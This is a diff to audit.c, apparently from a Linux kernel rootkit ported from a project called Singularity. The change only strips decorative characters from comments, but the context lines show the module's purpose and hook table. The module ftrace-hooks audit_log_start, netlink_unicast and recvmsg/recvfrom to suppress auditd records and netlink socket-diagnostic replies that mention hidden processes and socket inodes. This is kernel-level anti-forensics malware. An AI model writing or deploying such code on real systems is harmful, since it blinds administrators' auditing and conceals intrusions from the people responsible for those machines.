@@ -1,11 +1,11 @@
-/* audit.c — Suppresses auditd events for hidden processes.
+/* audit.c   Suppresses auditd events for hidden processes.
  *
  * Three interception layers:
  *   1. audit_log_start:    blocks audit buffer creation when current PID is hidden
  *   2. netlink_unicast:    drops NETLINK_AUDIT messages referencing hidden PIDs/inodes
  *   3. sys_recvmsg/recvfrom: filters NETLINK_SOCK_DIAG/NETLINK_NETFILTER responses
  *
- * Port from Singularity — ARCH_SYS() replaces __x64_sys_ in hooks table.
+ * Port from Singularity   ARCH_SYS() replaces __x64_sys_ in hooks table.
  * Register access converted to REGS_ARG macros for ARM64/x86_64 portability.
  */
 #include "../include/core.h"
@@ -24,7 +24,7 @@ static struct audit_buffer *(*orig_audit_log_start)(struct audit_context *ctx,
 static atomic_t blocked_audits = ATOMIC_INIT(0);
 static atomic_t total_audits   = ATOMIC_INIT(0);
 
-/* ── Hidden socket inode tracking ───────────────────────────────── */
+/*  Hidden socket inode tracking                                 */
 
 #define MAX_HIDDEN_INODES 256
 static unsigned long hidden_socket_inodes[MAX_HIDDEN_INODES];
@@ -72,7 +72,7 @@ static notrace bool is_inode_hidden(unsigned long ino)
     return found;
 }
 
-/* ── Socket scanning ─────────────────────────────────────────────── */
+/*  Socket scanning                                               */
 
 static notrace void scan_hidden_process_sockets(void)
 {
@@ -137,7 +137,7 @@ static notrace void scan_hidden_process_sockets(void)
     rcu_read_unlock();
 }
 
-/* ── Audit message parsing helpers ──────────────────────────────── */
+/*  Audit message parsing helpers                                */
 
 static notrace const char *find_substring_safe(const char *haystack, size_t hlen,
                                                 const char *needle, size_t nlen)
@@ -352,7 +352,7 @@ static notrace bool is_current_process_hidden(void)
     return false;
 }
 
-/* ── Hook implementations ────────────────────────────────────────── */
+/*  Hook implementations                                          */
 
 static notrace struct audit_buffer *hook_audit_log_start(struct audit_context *ctx,
                                                           gfp_t gfp_mask, int type)
@@ -509,7 +509,7 @@ static notrace asmlinkage long hook_recvfrom(const struct pt_regs *regs)
     return ret;
 }
 
-/* ── Hook table ──────────────────────────────────────────────────── */
+/*  Hook table                                                    */
 
 static struct ftrace_hook hooks[] = {
     HOOK("audit_log_start",          hook_audit_log_start, &orig_audit_log_start),
@@ -518,7 +518,7 @@ static struct ftrace_hook hooks[] = {
     HOOK(ARCH_SYS("recvfrom"),       hook_recvfrom,        &orig_recvfrom),
 };
 
-/* ── Init / Exit ─────────────────────────────────────────────────── */
+/*  Init / Exit                                                   */
 
 int audit_init(void)
 {
